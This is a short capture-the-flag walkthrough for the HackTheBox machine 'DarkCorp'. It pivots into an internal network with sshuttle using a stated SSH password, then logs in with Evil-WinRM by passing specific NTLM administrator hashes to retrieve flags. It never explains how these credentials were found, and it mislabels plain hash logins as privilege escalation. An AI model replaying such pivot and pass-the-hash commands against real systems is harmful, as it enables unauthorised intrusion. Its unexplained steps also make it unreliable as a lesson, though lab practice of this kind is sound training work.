---
title: "DarkCorp - HackTheBox Season 7 Walkthrough"
date: 2025-02-12
author: "Ans Inayat"
categories: [HackTheBox, Penetration Testing]
thumbnail: "https://pbs.twimg.com/media/GjHp3BjWcAAQAVB.jpg"
---

## Introduction

DarkCorp is a HackTheBox Season 7 machine that requires pivoting through an internal network using `sshuttle`. This guide will walk you through the steps to gain user and root access.

---

## Initial Access - Pivoting into the Internal Network

First, we need to establish access to the internal network using `sshuttle`. Clone the repository and navigate into the directory:

```bash
git clone https://github.com/sshuttle/sshuttle.git
cd sshuttle
```

Run `sshuttle` to establish a connection:

```bash
./run -r ebelford@<target-ip> -N 172.16.20.0/24
```

Alternatively, you can use:

```bash
sshuttle -r ebelford@<target-ip> -N 172.16.20.0/24
```

Enter the password when prompted:

```
password: ThePlague61780
```

Once connected, we have access to the internal network.

---

## User Access

With network access established, we can log in using Evil-WinRM to retrieve the user flag:

```bash
evil-winrm -i 172.16.20.1 -u "administrator" -H 'fcb3ca5a19a1ccf2d14c13e8b64cde0f'
```

Retrieve the user flag:

```
user flag: <flag_here>
```

Exit the session before proceeding to root access:

```bash
exit
```

---

## Root Access

To obtain root privileges, we log in to the second machine:

```bash
evil-winrm -i 172.16.20.2 -u Administrator -H '88d84ec08dad123eb04a060a74053f21'
```

Retrieve the root flag:

```
root flag: <flag_here>
```

---

## Conclusion

The DarkCorp machine required pivoting using `sshuttle` to gain internal network access, followed by using Evil-WinRM for privilege escalation. This exercise demonstrated network pivoting and Windows privilege escalation techniques essential for red teaming.

Happy hacking! 🚀
